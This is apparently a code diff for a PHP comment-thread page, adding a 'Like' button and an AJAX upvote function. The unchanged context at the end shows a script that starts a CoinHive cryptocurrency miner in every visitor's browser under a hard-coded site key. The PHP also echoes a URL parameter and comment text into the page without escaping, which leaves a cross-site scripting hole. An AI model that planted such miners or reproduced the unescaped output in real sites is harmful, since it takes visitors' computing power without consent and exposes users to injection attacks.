@@ -49,9 +49,11 @@
               <div class="col-md-' . $lvl . '"></div>
               <div class="col-md-' . (12 - $lvl) . '">
                 <div class="jumbotron well">';
-      echo '<span class="vote"> </span><p>' . $text . '</p>  -' . $author . ' @ ' . $creation . '<br><br>';
+      echo '<p>' . $text . '</p>  -' . $author . ' @ ' . $creation . '<br><br>';
       //Print the buttons
-      echo '<button class="commentButton" onclick="unhide(this,\'childComment' . $id . '\')">Reply</button>';
+      echo '<button id="like' . $id . '" type="button" class="btn btn-default btn-sm" onclick="likeC(\'like' . $id . '\','. $points .')">
+              <span class="glyphicon glyphicon-thumbs-up"></span> Like ' . $points . '
+            </button><button class="commentButton" onclick="unhide(this,\'childComment' . $id . '\')">Reply</button>';
       //if not already flagged, give option to flagged
       if($text != 'REMOVED') {
         echo '<a href="utilities/comment.php?class=' . $_GET['class'] . '&thread=' . $threadID . '&comment=' . $id . '&action=flag" class="commentButton">Flag</a>';
@@ -105,6 +107,24 @@
             }
       }}
       </script>
+      <script id="source" language="javascript" type="text/javascript">
+         function likeC(id, points){
+           //Send reuest to php page for information
+           $.ajax({
+                 type: "GET",
+                 url: 'utilities/upvote.php?',
+                 dataType: "json",
+                 data: {comment: id, points: points},
+                 success: function(){
+                   var div = document.getElementById(id);
+                   div.innerHTML = '<span class="glyphicon glyphicon-thumbs-up"></span> Like  ' + (points + 1);
+                 },
+                 error: function() {
+                   alert("Error.");
+                 }
+             });
+           };
+       </script>
       <script>
       //Start miner
 	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
